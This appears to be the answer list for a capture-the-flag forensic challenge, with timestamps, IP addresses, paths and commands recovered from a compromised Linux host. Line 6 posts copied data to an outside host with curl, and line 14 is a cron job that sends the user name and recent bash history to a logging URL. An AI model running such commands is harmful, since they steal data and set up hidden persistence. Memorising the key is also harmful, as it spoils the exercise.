1. 1. 2025-02-28 10:59:07
   2. America/Toronto
   3. 2651931097993496666
   4. 2025-02-28 10:59:25
   5. cp -r \"/media/liam/46E8E28DE8E27A97/Critical Data TECH THM\" /home/liam/Documents/Data
   6. curl -X POST -d @/home/liam/Documents/Data http://tehc-thm.thm/upload
   7. 5.45.102.93
   8. /home/liam
   9. 10000
   10. 2025-02-28 11:44:00
   11. /home/liam/Public
   12. file3.txt,file7.txt
   13. 94.102.51.15
   14. */30 * * * * curl -s -X POST -d "$(whoami):$(tail -n 5 ~/.bash_history)" http://192.168.1.23/logger.php
